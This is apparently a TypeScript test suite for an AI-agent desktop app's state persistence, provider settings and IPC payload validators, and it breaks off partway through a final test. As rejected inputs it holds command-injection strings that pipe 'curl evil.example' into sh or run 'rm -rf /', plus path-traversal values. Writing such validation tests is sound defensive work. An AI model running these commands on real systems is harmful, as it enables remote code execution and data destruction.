import { describe, expect, it } from "vitest";
import { IpcValidationError } from "./ipc-validation.js";
import {
  activeCompanion,
  AGENT_PROFILE_VERSION,
  AGENT_STATE_VERSION,
  boundRuns,
  boundStepDetail,
  boundSteps,
  defaultModelFor,
  emptyAgentProfile,
  emptyAgentState,
  emptyConfigStatus,
  hasOwnCredential,
  MAX_AGENTS,
  MAX_AGENT_NAME_LENGTH,
  MAX_COMMAND_LENGTH,
  MAX_RUNS_RETAINED,
  MAX_STEP_DETAIL_LENGTH,
  MAX_STEPS_RETAINED,
  MAX_TASK_LENGTH,
  parseAgentProfile,
  parseCompanionIdPayload,
  parseCreateCompanionPayload,
  parseCredentialScopePayload,
  parsePersistedAgentState,
  parseResolveApprovalPayload,
  parseRunIdPayload,
  parseSetCredentialPayload,
  parseSetOrchestratorPayload,
  parseStartRunPayload,
  parseUpdateCompanionPayload,
  pendingApproval,
  providerDescriptor,
  PROVIDERS,
  requireCommand,
  resolvedProvider,
  restoredStatus,
  toPersistedAgentState,
  type AgentCompanion,
  type AgentRunState,
  type AgentRunStatus,
  type AgentSnapshot,
  type AgentStep
} from "./agents.js";

function step(overrides: Partial<AgentStep> = {}): AgentStep {
  return {
    id: "step-1",
    kind: "message",
    label: "Read the page",
    detail: null,
    tabId: "tab-1",
    at: 1_700_000_000_000,
    ...overrides
  };
}

function run(overrides: Partial<AgentRunState> = {}): AgentRunState {
  return {
    id: "run-1",
    companionId: "companion-1",
    task: "Summarize the open tabs",
    status: "done",
    steps: [step()],
    pendingApproval: null,
    startedAt: 1_700_000_000_000,
    endedAt: 1_700_000_001_000,
    ...overrides
  };
}

function companion(overrides: Partial<AgentCompanion> = {}): AgentCompanion {
  return {
    id: "companion-1",
    name: "Scout",
    role: "research",
    skillPaths: [],
    provider: null,
    model: null,
    baseUrl: null,
    command: null,
    ...overrides
  };
}

function snapshot(overrides: Partial<AgentSnapshot> = {}): AgentSnapshot {
  return {
    companions: [companion()],
    activeCompanionId: "companion-1",
    runs: [run()],
    activeRunId: "run-1",
    config: { ...emptyConfigStatus(), configured: true, encryption: "available" },
    ...overrides
  };
}

describe("restoredStatus", () => {
  it("downgrades every status that implies a running loop", () => {
    const live: readonly AgentRunStatus[] = [
      "idle",
      "planning",
      "acting",
      "awaiting-approval",
      "paused"
    ];

    for (const status of live) {
      expect(restoredStatus(status)).toBe("paused");
    }
  });

  it("leaves a finished run finished", () => {
    expect(restoredStatus("done")).toBe("done");
    expect(restoredStatus("failed")).toBe("failed");
    expect(restoredStatus("cancelled")).toBe("cancelled");
  });
});

describe("toPersistedAgentState", () => {
  it("never persists a run as still acting, so a restart cannot resume one", () => {
    const state = toPersistedAgentState(
      snapshot({ runs: [run({ status: "acting", endedAt: null })] })
    );

    expect(state.runs.map((entry) => entry.status)).toEqual(["paused"]);
  });

  it("keeps a pending approval intact, so the gate is still owed a decision", () => {
    const approval = {
      id: "approval-1",
      runId: "run-1",
      toolName: "click",
      summary: "Press Send on mail.example.com",
      reason: "The control sends a message.",
      tabId: "tab-1"
    };

    const state = toPersistedAgentState(
      snapshot({
        runs: [run({ status: "awaiting-approval", pendingApproval: approval, endedAt: null })]
      })
    );

    expect(state.runs.map((entry) => entry.status)).toEqual(["paused"]);
    expect(state.runs.map((entry) => entry.pendingApproval)).toEqual([approval]);
  });

  it("carries no field that could hold a credential or a local path", () => {
    const serialized = JSON.stringify(toPersistedAgentState(snapshot()));

    // The provider key lives only in the main process's encrypted store. There
    // is no field for it here, which is what makes leaking it impossible rather
    // than merely unlikely.
    expect(serialized).not.toContain("key");
    expect(serialized).not.toContain("credential");
    expect(serialized).not.toContain("apiKey");
    expect(serialized).not.toContain("config");
  });

  it("trims a transcript that outgrew the retention bound", () => {
    const steps = Array.from({ length: MAX_STEPS_RETAINED + 10 }, (_, index) =>
      step({ id: `step-${index}`, label: `Step ${index}` })
    );

    const state = toPersistedAgentState(snapshot({ runs: [run({ steps })] }));

    expect(state.runs[0]?.steps).toHaveLength(MAX_STEPS_RETAINED);
    // The newest steps survive: losing the opening of a long run is acceptable,
    // losing what just happened is not.
    expect(state.runs[0]?.steps.at(-1)?.label).toBe(`Step ${MAX_STEPS_RETAINED + 9}`);
  });
});

describe("parsePersistedAgentState", () => {
  it("round-trips state it just wrote", () => {
    const written = toPersistedAgentState(snapshot());
    const read = parsePersistedAgentState(JSON.parse(JSON.stringify(written)));

    expect(read).toEqual(written);
  });

  it("returns empty state rather than throwing on a corrupt file", () => {
    expect(parsePersistedAgentState(null)).toEqual(emptyAgentState());
    expect(parsePersistedAgentState("not an object")).toEqual(emptyAgentState());
    expect(parsePersistedAgentState({ version: 1, runs: "nope" })).toEqual(
      emptyAgentState()
    );
    expect(parsePersistedAgentState([])).toEqual(emptyAgentState());
  });

  it("ignores a file written by a different version", () => {
    const written = toPersistedAgentState(snapshot());

    expect(
      parsePersistedAgentState({ ...written, version: AGENT_STATE_VERSION + 1 })
    ).toEqual(emptyAgentState());
  });

  it("downgrades a hand-edited running status instead of trusting it", () => {
    const written = toPersistedAgentState(snapshot());
    const tampered = {
      ...written,
      runs: [{ ...written.runs[0], status: "acting" }]
    };

    expect(parsePersistedAgentState(tampered).runs.map((entry) => entry.status)).toEqual([
      "paused"
    ]);
  });

  it("drops a run whose companion did not survive validation", () => {
    const written = toPersistedAgentState(snapshot());

    expect(
      parsePersistedAgentState({ ...written, companions: [] }).runs
    ).toEqual([]);
  });

  it("drops duplicate ids rather than letting one shadow another", () => {
    const written = toPersistedAgentState(snapshot());
    const doubled = {
      ...written,
      companions: [...written.companions, ...written.companions],
      runs: [...written.runs, ...written.runs]
    };

    const read = parsePersistedAgentState(doubled);

    expect(read.companions).toHaveLength(1);
    expect(read.runs).toHaveLength(1);
  });

  it("reads an agent written before providers could be pinned", () => {
    const written = toPersistedAgentState(snapshot());
    const legacy = {
      ...written,
      companions: [{ id: "companion-1", name: "Scout", role: "research", skillPaths: [] }]
    };

    // Absent means "follows the orchestrator", which is what such an agent was.
    expect(parsePersistedAgentState(legacy).companions[0]).toEqual(
      companion({ provider: null, model: null })
    );
  });

  it("keeps a pinned provider across a restart", () => {
    const written = toPersistedAgentState(
      snapshot({ companions: [companion({ provider: "openai", model: "gpt-5" })] })
    );

    const read = parsePersistedAgentState(JSON.parse(JSON.stringify(written)));

    expect(read.companions[0]?.provider).toBe("openai");
    expect(read.companions[0]?.model).toBe("gpt-5");
  });

  it("drops a selection naming an agent that did not survive validation", () => {
    const written = toPersistedAgentState(snapshot({ activeCompanionId: "companion-gone" }));

    expect(parsePersistedAgentState(JSON.parse(JSON.stringify(written)))
      .activeCompanionId).toBeNull();
  });

  it("refuses a roster larger than the contract bound", () => {
    const written = toPersistedAgentState(
      snapshot({
        companions: Array.from({ length: MAX_AGENTS + 1 }, (_, index) =>
          companion({ id: `companion-${index}` })
        )
      })
    );

    // Rejecting the file outright rather than silently keeping a prefix: a
    // roster this size was not written by this app.
    expect(parsePersistedAgentState(JSON.parse(JSON.stringify(written)))).toEqual(
      emptyAgentState()
    );
  });

  it("rebinds a stored approval to its own run rather than the named one", () => {
    const written = toPersistedAgentState(
      snapshot({
        runs: [
          run({
            pendingApproval: {
              id: "approval-1",
              runId: "some-other-run",
              toolName: "click",
              summary: "Press Send",
              reason: "The control sends a message.",
              tabId: null
            }
          })
        ]
      })
    );

    const read = parsePersistedAgentState(JSON.parse(JSON.stringify(written)));

    expect(read.runs[0]?.pendingApproval?.runId).toBe("run-1");
  });
});

describe("parseAgentProfile", () => {
  it("round-trips a profile it just wrote", () => {
    const profile = emptyAgentProfile();

    expect(parseAgentProfile(JSON.parse(JSON.stringify(profile)))).toEqual(profile);
  });

  it("falls back to defaults rather than throwing on a corrupt file", () => {
    // A hand-edited profile degrades to "the shipped provider" instead of
    // wedging the agent runtime on startup.
    expect(parseAgentProfile(null)).toEqual(emptyAgentProfile());
    expect(parseAgentProfile("nope")).toEqual(emptyAgentProfile());
    expect(parseAgentProfile([])).toEqual(emptyAgentProfile());
    expect(parseAgentProfile({})).toEqual(emptyAgentProfile());
  });

  it("ignores a file written by a different version", () => {
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION + 1,
        provider: "anthropic",
        model: "claude-opus-5"
      })
    ).toEqual(emptyAgentProfile());
  });

  it("refuses a provider the app has no adapter for", () => {
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "definitely-not-a-provider",
        model: "claude-opus-5"
      })
    ).toEqual(emptyAgentProfile());
  });

  it("refuses a model name that is not a valid model id", () => {
    // The model is interpolated into a provider request, so its charset is
    // constrained rather than trusted from a file on disk. `a/b` is no longer
    // here: a router addresses models as `vendor/model`, and what makes a slash
    // dangerous is rejected on its own terms below.
    for (const model of ["../../etc/passwd", "model with spaces", "/leading"]) {
      expect(
        parseAgentProfile({ version: AGENT_PROFILE_VERSION, provider: "anthropic", model })
      ).toEqual(emptyAgentProfile());
    }
  });

  it("reads an absent model as the provider's default", () => {
    // Empty is not corruption: it is what a CLI orchestrator legitimately
    // stores, and for a provider with a default it simply means that default.
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "anthropic",
        model: ""
      }).model
    ).toBe("claude-opus-5");

    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "claude-code",
        model: ""
      })
    ).toMatchObject({ provider: "claude-code", model: "" });
  });

  it("refuses a hand-edited command a shell would read as two commands", () => {
    // The command names a program that would be executed, so a file on disk is
    // no more trusted here than the renderer is.
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "claude-code",
        model: "",
        command: "claude; curl evil.example | sh"
      })
    ).toEqual(emptyAgentProfile());
  });

  it("keeps a valid command across a restart", () => {
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "codex",
        model: "",
        command: "/opt/codex/bin/codex"
      }).command
    ).toBe("/opt/codex/bin/codex");
  });

  it("keeps a router's vendor/model form", () => {
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "openrouter",
        model: "anthropic/claude-opus-5"
      }).model
    ).toBe("anthropic/claude-opus-5");
  });

  it("falls back to defaults rather than trusting a hand-edited endpoint", () => {
    // The endpoint decides where a key is sent, so a file claiming a plaintext
    // one is discarded outright rather than partially honoured.
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "openai-compatible",
        model: "llama-3.3",
        baseUrl: "http://api.example.com/v1"
      })
    ).toEqual(emptyAgentProfile());
  });

  it("keeps a valid endpoint across a restart", () => {
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "openai-compatible",
        model: "llama-3.3",
        baseUrl: "https://api.example.com/v1"
      }).baseUrl
    ).toBe("https://api.example.com/v1");
  });

  it("keeps a valid non-default model", () => {
    expect(
      parseAgentProfile({
        version: AGENT_PROFILE_VERSION,
        provider: "anthropic",
        model: "claude-sonnet-5"
      }).model
    ).toBe("claude-sonnet-5");
  });
});

describe("activeCompanion", () => {
  it("prefers the selected agent", () => {
    const state = snapshot({
      companions: [companion({ id: "companion-1" }), companion({ id: "companion-2" })],
      activeCompanionId: "companion-2"
    });

    expect(activeCompanion(state)?.id).toBe("companion-2");
  });

  it("falls back to the first agent when the selection is stale", () => {
    // A deleted agent must not leave the composer addressing nothing.
    const state = snapshot({ activeCompanionId: "companion-gone" });

    expect(activeCompanion(state)?.id).toBe("companion-1");
  });

  it("reports nothing when the roster is empty", () => {
    expect(activeCompanion(snapshot({ companions: [], runs: [] }))).toBeNull();
  });
});

describe("resolvedProvider", () => {
  const config = { ...emptyConfigStatus(), provider: "openai", model: "gpt-5" };

  it("follows the orchestrator when the agent is not pinned", () => {
    expect(resolvedProvider(companion(), config)).toEqual({
      provider: "openai",
      model: "gpt-5",
      baseUrl: null,
      command: null,
      inherited: true
    });
  });

  it("uses the agent's own provider once it is pinned", () => {
    const pinned = companion({ provider: "anthropic", model: "claude-sonnet-5" });

    expect(resolvedProvider(pinned, config)).toEqual({
      provider: "anthropic",
      model: "claude-sonnet-5",
      baseUrl: null,
      command: null,
      inherited: false
    });
  });

  it("resolves a CLI agent to the program that would run", () => {
    // The preset's command when none was given, so the route is complete
    // whether or not the user knew to override it.
    expect(resolvedProvider(companion({ provider: "claude-code" }), config).command).toBe(
      "claude"
    );

    expect(
      resolvedProvider(
        companion({ provider: "codex", command: "/opt/codex/bin/codex" }),
        config
      ).command
    ).toBe("/opt/codex/bin/codex");
  });

  it("carries the agent's own endpoint, which is half of where a run goes", () => {
    const pinned = companion({
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://api.example.com/v1"
    });

    expect(resolvedProvider(pinned, config).baseUrl).toBe("https://api.example.com/v1");
  });

  it("takes the provider's default model when the agent named none", () => {
    // Pinning a provider without naming a model must not silently carry the
    // orchestrator's model to a provider that has never heard of it.
    const pinned = companion({ provider: "google", model: null });

    expect(resolvedProvider(pinned, config).model).toBe(defaultModelFor("google"));
  });

  it("falls back to the orchestrator when there is no agent at all", () => {
    expect(resolvedProvider(null, config).inherited).toBe(true);
  });
});

describe("providerDescriptor", () => {
  it("names every shipped provider and nothing else", () => {
    expect(providerDescriptor("anthropic")?.label).toBe("Anthropic");
    expect(providerDescriptor("openrouter")?.label).toBe("OpenRouter");
    expect(providerDescriptor("omniroute")?.label).toBe("OmniRoute");
    expect(providerDescriptor("moonshot")?.label).toBe("Moonshot AI");
    expect(providerDescriptor("qwen")?.label).toBe("Qwen");
    expect(providerDescriptor("definitely-not-a-provider")).toBeNull();
  });

  it("marks a local runtime as needing no credential", () => {
    // A provider running on this machine authenticates nothing, so demanding a
    // key would invent a barrier and then report it as a fault.
    expect(providerDescriptor("ollama")?.requiresCredential).toBe(false);
    expect(providerDescriptor("anthropic")?.requiresCredential).toBe(true);
  });

  it("asks for an endpoint only where the endpoint is the user's to name", () => {
    expect(providerDescriptor("openai-compatible")?.requiresBaseUrl).toBe(true);

    for (const preset of ["anthropic", "openai", "openrouter", "moonshot", "qwen"]) {
      expect(providerDescriptor(preset)?.requiresBaseUrl).toBe(false);
    }
  });

  it("ships no default model for a service whose models it cannot know", () => {
    // A compatible endpoint serves whatever its operator loaded, so a prefilled
    // name would be a guess presented as a fact.
    expect(defaultModelFor("openai-compatible")).toBe("");
    expect(defaultModelFor("openrouter")).toBe("anthropic/claude-opus-5");
  });

  it("gives every provider a line explaining what it is", () => {
    for (const descriptor of PROVIDERS) {
      expect(descriptor.summary.length).toBeGreaterThan(0);
    }
  });

  it("ships each agentic CLI with the program it expects to find", () => {
    const commands = Object.fromEntries(
      PROVIDERS.filter((entry) => entry.transport === "cli").map((entry) => [
        entry.id,
        entry.defaultCommand
      ])
    );

    expect(commands).toEqual({
      "claude-code": "claude",
      codex: "codex",
      antigravity: "antigravity",
      "gemini-cli": "gemini",
      opencode: "opencode",
      "kimi-code": "kimi",
      "qwen-code": "qwen"
    });
  });

  it("stores no key for a CLI, which already holds its own session", () => {
    // A second copy of a credential is a second place for it to leak from, and
    // these tools have already signed in.
    for (const descriptor of PROVIDERS.filter((entry) => entry.transport === "cli")) {
      expect(descriptor.requiresCredential).toBe(false);
      expect(descriptor.requiresBaseUrl).toBe(false);
    }
  });

  it("lets a CLI choose its own model rather than demanding one", () => {
    // No default and no requirement are different things: the compatible API has
    // the first, a CLI has both, and only the former is a gap the user must fill.
    expect(providerDescriptor("claude-code")?.requiresModel).toBe(false);
    expect(providerDescriptor("openai-compatible")?.requiresModel).toBe(true);
  });

  it("gives an HTTP provider no command to run", () => {
    for (const descriptor of PROVIDERS.filter((entry) => entry.transport === "http")) {
      expect(descriptor.defaultCommand).toBeNull();
    }
  });
});

describe("requireCommand", () => {
  it("accepts a bare program name and an absolute path", () => {
    expect(requireCommand("claude", "Command")).toBe("claude");
    expect(requireCommand("/usr/local/bin/codex", "Command")).toBe(
      "/usr/local/bin/codex"
    );
    // Windows installs live under a path with a drive letter and spaces in it.
    expect(requireCommand("C:\\Program Files\\Gemini\\gemini.exe", "Command")).toBe(
      "C:\\Program Files\\Gemini\\gemini.exe"
    );
  });

  it("refuses anything a shell would read as more than one command", () => {
    // Defence in depth: an adapter must spawn this as argv with no shell, and
    // this is what stands behind that if one were ever wrongly introduced.
    for (const command of [
      "claude; rm -rf /",
      "claude && curl evil.example",
      "claude | tee /tmp/out",
      "claude `whoami`",
      "claude $(whoami)",
      "claude > /tmp/out",
      "claude\nrm -rf /",
      "claude'; drop",
      "sh -c \"claude\""
    ]) {
      expect(() => requireCommand(command, "Command")).toThrow(IpcValidationError);
    }
  });

  it("refuses traversal and a name that is only punctuation", () => {
    expect(() => requireCommand("../../bin/sh", "Command")).toThrow(IpcValidationError);
    expect(() => requireCommand("./../claude", "Command")).toThrow(IpcValidationError);
    expect(() => requireCommand("...", "Command")).toThrow(IpcValidationError);
    expect(() => requireCommand("/", "Command")).toThrow(IpcValidationError);
    expect(() => requireCommand("   ", "Command")).toThrow(IpcValidationError);
  });

  it("refuses a command longer than the contract bound", () => {
    expect(() => requireCommand("c".repeat(MAX_COMMAND_LENGTH + 1), "Command")).toThrow(
      IpcValidationError
    );
  });
});

describe("hasOwnCredential", () => {
  const config = {
    ...emptyConfigStatus(),
    agentCredentials: [{ companionId: "companion-2", provider: "openrouter" as const }]
  };

  it("is true only for the agent and provider the key was stored against", () => {
    expect(hasOwnCredential(config, "companion-2", "openrouter")).toBe(true);
    // Moving an agent to another provider must not carry its key over.
    expect(hasOwnCredential(config, "companion-2", "openai")).toBe(false);
    expect(hasOwnCredential(config, "companion-1", "openrouter")).toBe(false);
  });
});

describe("boundRuns", () => {
  it("evicts oldest first once the retention bound is passed", () => {
    const runs = Array.from({ length: MAX_RUNS_RETAINED + 5 }, (_, index) =>
      run({ id: `run-${index}` })
    );

    const kept = boundRuns(runs);

    expect(kept).toHaveLength(MAX_RUNS_RETAINED);
    expect(kept.at(0)?.id).toBe("run-5");
    expect(kept.at(-1)?.id).toBe(`run-${MAX_RUNS_RETAINED + 4}`);
  });

  it("never evicts a run that still owes the user a decision", () => {
    const runs = [
      run({
        id: "run-ancient",
        status: "awaiting-approval",
        pendingApproval: {
          id: "approval-1",
          runId: "run-ancient",
          toolName: "click",
          summary: "Press Send",
          reason: "The control sends a message.",
          tabId: null
        }
      }),
      ...Array.from({ length: MAX_RUNS_RETAINED + 5 }, (_, index) =>
        run({ id: `run-${index}` })
      )
    ];

    expect(boundRuns(runs).map((entry) => entry.id)).toContain("run-ancient");
  });
});

describe("boundStepDetail", () => {
  it("normalises an absent detail to null", () => {
    expect(boundStepDetail(null)).toBeNull();
    expect(boundStepDetail("")).toBeNull();
  });

  it("truncates rather than rejecting an oversized page excerpt", () => {
    const detail = boundStepDetail("x".repeat(MAX_STEP_DETAIL_LENGTH + 500));

    expect(detail).toHaveLength(MAX_STEP_DETAIL_LENGTH);
  });
});

describe("boundSteps", () => {
  it("leaves a short transcript untouched", () => {
    const steps = [step()];

    expect(boundSteps(steps)).toBe(steps);
  });
});

describe("pendingApproval", () => {
  it("finds the request the chrome must be showing", () => {
    const approval = {
      id: "approval-1",
      runId: "run-2",
      toolName: "navigate",
      summary: "Open checkout.example.com",
      reason: "Navigation leaves the current origin.",
      tabId: "tab-1"
    };

    const found = pendingApproval(
      snapshot({
        runs: [run(), run({ id: "run-2", pendingApproval: approval })]
      })
    );

    expect(found).toEqual(approval);
  });

  it("reports nothing when no run is gated", () => {
    expect(pendingApproval(snapshot())).toBeNull();
  });
});

describe("IPC payload parsers", () => {
  it("accepts a well-formed run request", () => {
    expect(
      parseStartRunPayload({
        companionId: "companion-1",
        task: "Find the pricing page",
        tabIds: ["tab-1", "tab-2"]
      })
    ).toEqual({
      companionId: "companion-1",
      task: "Find the pricing page",
      tabIds: ["tab-1", "tab-2"]
    });
  });

  it("drops a repeated context tab so a tab cannot be granted twice", () => {
    const payload = parseStartRunPayload({
      companionId: "companion-1",
      task: "Compare these",
      tabIds: ["tab-1", "tab-1", "tab-2"]
    });

    expect(payload.tabIds).toEqual(["tab-1", "tab-2"]);
  });

  it("rejects a task longer than the contract bound", () => {
    expect(() =>
      parseStartRunPayload({
        companionId: "companion-1",
        task: "x".repeat(MAX_TASK_LENGTH + 1),
        tabIds: []
      })
    ).toThrow(IpcValidationError);
  });

  it("rejects an empty task, which would start a run with no instruction", () => {
    expect(() =>
      parseStartRunPayload({ companionId: "companion-1", task: "", tabIds: [] })
    ).toThrow(IpcValidationError);
  });

  it("rejects a companion id that is not an app-minted handle", () => {
    expect(() =>
      parseStartRunPayload({
        companionId: "../../etc/passwd",
        task: "Read it",
        tabIds: []
      })
    ).toThrow(IpcValidationError);
  });

  it("accepts only the two approval decisions", () => {
    expect(
      parseResolveApprovalPayload({ approvalId: "approval-1", decision: "allow" })
    ).toEqual({ approvalId: "approval-1", decision: "allow" });

    expect(() =>
      parseResolveApprovalPayload({ approvalId: "approval-1", decision: "maybe" })
    ).toThrow(IpcValidationError);
  });

  it("reads a run id", () => {
    expect(parseRunIdPayload({ runId: "run-1" })).toEqual({ runId: "run-1" });
    expect(() => parseRunIdPayload({})).toThrow(IpcValidationError);
  });

  it("accepts only a known provider", () => {
    expect(
      parseSetCredentialPayload({ provider: "anthropic", key: "sk-test-123" })
    ).toEqual({ provider: "anthropic", key: "sk-test-123", companionId: null });

    expect(() =>
      parseSetCredentialPayload({ provider: "totally-legit", key: "sk-test-123" })
    ).toThrow(IpcValidationError);
  });

  it("scopes a credential to one agent when asked to", () => {
    expect(
      parseSetCredentialPayload({
        provider: "openrouter",
        key: "sk-test-123",
        companionId: "companion-4"
      }).companionId
    ).toBe("companion-4");
  });

  it("reads a credential scope, shared or belonging to one agent", () => {
    expect(parseCredentialScopePayload({ provider: "openai", companionId: null })).toEqual(
      { provider: "openai", companionId: null }
    );

    expect(
      parseCredentialScopePayload({ provider: "openrouter", companionId: "companion-2" })
    ).toEqual({ provider: "openrouter", companionId: "companion-2" });

    expect(() => parseCredentialScopePayload({ provider: "nope" })).toThrow(
      IpcValidationError
    );
    expect(() =>
      parseCredentialScopePayload({ provider: "openai", companionId: "../../etc" })
    ).toThrow(IpcValidationError);
  });

  it("accepts an orchestrator change to a known provider and model", () => {
    expect(
      parseSetOrchestratorPayload({ provider: "google", model: "gemini-2.5-pro" })
    ).toEqual({
      provider: "google",
      model: "gemini-2.5-pro",
      baseUrl: null,
      command: null
    });
  });

  it("refuses an orchestrator model that is not a valid model id", () => {
    for (const model of ["../../etc/passwd", "model with spaces", "/leading"]) {
      expect(() =>
        parseSetOrchestratorPayload({ provider: "anthropic", model })
      ).toThrow(IpcValidationError);
    }
  });

  it("reads an empty orchestrator model as the provider's default", () => {
    expect(
      parseSetOrchestratorPayload({ provider: "anthropic", model: "" }).model
    ).toBe("claude-opus-5");

    // But not where there is no default and the provider cannot choose.
    expect(() =>
      parseSetOrchestratorPayload({ provider: "openai-compatible", model: "" })
    ).toThrow(IpcValidationError);
  });

  it("accepts the vendor/model form a router addresses models with", () => {
    // OpenRouter and OmniRoute name models as `vendor/model`, so the separator
    // has to be allowed — what makes a slash dangerous is banned separately.
    expect(
      parseSetOrchestratorPayload({
        provider: "openrouter",
        model: "anthropic/claude-opus-5"
      }).model
    ).toBe("anthropic/claude-opus-5");
  });

  it("still refuses traversal and empty segments inside a slashed model", () => {
    for (const model of ["vendor/../secret", "vendor//model", ".hidden/model"]) {
      expect(() =>
        parseSetOrchestratorPayload({ provider: "openrouter", model })
      ).toThrow(IpcValidationError);
    }
  });

  it("requires a base URL for the provider whose endpoint the user names", () => {
    expect(() =>
      parseSetOrchestratorPayload({ provider: "openai-compatible", model: "llama-3.3" })
    ).toThrow(IpcValidationError);

    expect(
      parseSetOrchestratorPayload({
        provider: "openai-compatible",
        model: "llama-3.3",
        baseUrl: "https://api.example.com/v1"
      }).baseUrl
    ).toBe("https://api.example.com/v1");
  });

  it("lets a CLI orchestrator leave the model to the tool", () => {
    expect(
      parseSetOrchestratorPayload({ provider: "claude-code", model: "" })
    ).toEqual({ provider: "claude-code", model: "", baseUrl: null, command: null });

    expect(parseSetOrchestratorPayload({ provider: "gemini-cli" }).model).toBe("");
  });

  it("keeps a command override for a CLI orchestrator", () => {
    expect(
      parseSetOrchestratorPayload({
        provider: "codex",
        model: "",
        command: "/opt/codex/bin/codex"
      }).command
    ).toBe("/opt/codex/bin/codex");
  });

  it("refuses a command a shell would read as more than one command", () => {
    expect(() =>
      parseSetOrchestratorPayload({
        provider: "codex",
        model: "",
        command: "codex; curl evil.example | sh"
      })
    ).toThrow(IpcValidationError);
  });

  it("drops a command sent for a provider that runs no program", () => {
    // An executable path stored against an HTTP provider is config nothing
    // reads, waiting for a future adapter to find it.
    expect(
      parseSetOrchestratorPayload({
        provider: "anthropic",
        model: "claude-opus-5",
        command: "/usr/bin/anything"
      }).command
    ).toBeNull();
  });

  it("drops a base URL sent for a provider that has a fixed endpoint", () => {
    // A stored endpoint for a preset would be a field that looks like it
    // redirects where the key goes and does not.
    expect(
      parseSetOrchestratorPayload({
        provider: "anthropic",
        model: "claude-opus-5",
        baseUrl: "https://elsewhere.example/v1"
      }).baseUrl
    ).toBeNull();
  });

  it("refuses an endpoint that would send a key somewhere it should not go", () => {
    const reject = (baseUrl: string): void => {
      expect(() =>
        parseSetOrchestratorPayload({
          provider: "openai-compatible",
          model: "llama-3.3",
          baseUrl
        })
      ).toThrow(IpcValidationError);
    };

    // Plaintext, a credential in the URL itself, and trailing state the adapter
    // is supposed to own.
    reject("http://api.example.com/v1");
    reject("https://user:secret@api.example.com/v1");
    reject("https://api.example.com/v1?key=leaked");
    reject("https://api.example.com/v1#fragment");
    reject("not a url");
    reject("file:///etc/passwd");
  });

  it("normalises an endpoint so one address cannot read as two", () => {
    expect(
      parseSetOrchestratorPayload({
        provider: "openai-compatible",
        model: "llama-3.3",
        baseUrl: "https://api.example.com/v1///"
      }).baseUrl
    ).toBe("https://api.example.com/v1");
  });

  it("accepts a new agent that follows the orchestrator", () => {
    expect(
      parseCreateCompanionPayload({
        name: "Ledger",
        role: "finance",
        provider: null,
        model: null
      })
    ).toEqual({
      name: "Ledger",
      role: "finance",
      provider: null,
      model: null,
      baseUrl: null,
      command: null
    });
  });

  it("accepts a new agent pinned to a local CLI, with no model and no key", () => {
    expect(
      parseCreateCompanionPayload({
        name: "Coder",
        role: "engineering",
        provider: "claude-code"
      })
    ).toEqual({
      name: "Coder",
      role: "engineering",
      provider: "claude-code",
      model: null,
      baseUrl: null,
      command: null
    });
  });

  it("keeps a per-agent command override for a CLI agent", () => {
    expect(
      parseCreateCompanionPayload({
        name: "Coder",
        role: "engineering",
        provider: "opencode",
        command: "/opt/opencode/bin/opencode"
      }).command
    ).toBe("/opt/opencode/bin/opencode");
  });

  it("refuses an agent command a shell would read as more than one command", () => {
    expect(() =>
      parseCreateCompanionPayload({
        name: "Coder",
        role: "engineering",
        provider: "opencode",
        command: "opencode && curl evil.example | sh"
      })
    ).toThrow(IpcValidationError);
  });

  it("requires an agent on a compatible service to name both endpoint and model", () => {
    // There is no default to fall back to: a compatible service serves whatever
    // its operator loaded, so guessing a model name would be inventing a fact.
    expect(() =>
      parseCreateCompanionPayload({
        name: "Local",
        role: "research",
        provider: "openai-compatible",
        model: null,
        baseUrl: "https://api.example.com/v1"
      })
    ).toThrow(IpcValidationError);

    expect(() =>
      parseCreateCompanionPayload({
        name: "Local",
        role: "research",
        provider: "openai-compatible",
        model: "llama-3.3",
        baseUrl: null
      })
    ).toThrow(IpcValidationError);

    expect(
      parseCreateCompanionPayload({
        name: "Local",
        role: "research",
        provider: "openai-compatible",
        model: "llama-3.3",
        baseUrl: "https://api.example.com/v1"
      })
    ).toEqual({
      name: "Local",
      role: "research",
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://api.example.com/v1",
      command: null
    });
  });

  it("accepts a new agent pinned to its own provider", () => {
    expect(
      parseCreateCompanionPayload({
        name: "Ledger",
        role: "finance",
        provider: "openai",
        model: "gpt-5"
      }).provider
    ).toBe("openai");
  });

  it("treats an absent provider or model as following the default", () => {
    expect(parseCreateCompanionPayload({ name: "Ledger", role: "finance" })).toEqual({
      name: "Ledger",
      role: "finance",
      provider: null,
      model: null,
      baseUrl: null,
      command: null
    });
  });

  it("refuses an agent name longer than the contract bound", () => {
    expect(() =>
      parseCreateCompanionPayload({
        name: "x".repeat(MAX_AGENT_NAME_LENGTH + 1),
        role: "finance",
        provider: null,
        model: null
      })
    ).toThrow(IpcValidationError);
  });

  it("refuses a role that is not a slug, so it stays safe as a lookup key", () => {
    expect(() =>
      parseCreateCompanionPayload({
        name: "Ledger",
        role: "finance and accounting",
        provider: null,
        model: null
      })
    ).toThrow(IpcValidationError);
  });

  it("refuses a provider the app has no adapter for", () => {
    expect(() =>
      parseCreateCompanionPayload({
        name: "Ledger",
        role: "finance",
        provider: "totally-legit",
        model: null
      })
    ).toThrow(IpcValidationError);
  });

  it("requires an update to name the agent it changes", () => {
    expect(
      parseUpdateCompanionPayload({
        companionId: "companion-1",
        name: "Ledger",
        role: "finance",
        provider: null,
        model: null
      }).companionId
    ).toBe("companion-1");

    expect(() =>
      parseUpdateCompanionPayload({ name: "Ledger", role: "finance" })
    ).toThrow(IpcValidationError);
  });

  it("reads an agent id, and refuses one that is not an app-minted handle", () => {
    expect(parseCompanionIdPayload({ companionId: "companion-1" })).toEqual({
      companionId: "companion-1"
    });

    expect(() => parseCompanionIdPayload({ companionId: "../../etc/passwd" })).toThrow(
      IpcValidationError
    );
  });

  it("does not leak the rejected credential into the error message", () => {
    const secret = "sk-live-do-not-log-this";

    try {
